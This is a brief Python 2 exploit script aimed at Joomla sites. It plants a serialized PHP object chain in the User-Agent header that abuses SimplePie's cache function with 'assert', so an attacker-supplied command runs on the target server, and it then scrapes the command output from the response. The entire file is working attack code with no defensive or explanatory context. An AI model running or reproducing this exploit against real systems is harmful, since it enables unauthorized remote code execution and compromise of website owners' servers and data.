import requests 
import re 
import sys 

url = sys.argv[1] 
command = sys.argv[2] 
def attack(uid): 
    headers = { 
    "User-Agent":'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\x5C0\x5C0\x5C0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:%s:"%s;JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\x5C0\x5C0\x5C0connection";b:1;}\xF0\x9D\x8C\x86'''%(len(command)+28,command) 
            } 
    s = requests.session() 
    response = s.get(url='%s'%url,headers=headers) 
    response = s.get(url='%s'%url) 
    info = response.content 
    return info 

info = attack(url) 
result = re.findall(r'</html>(.*)',info,re.S|re.I) 
print result[0]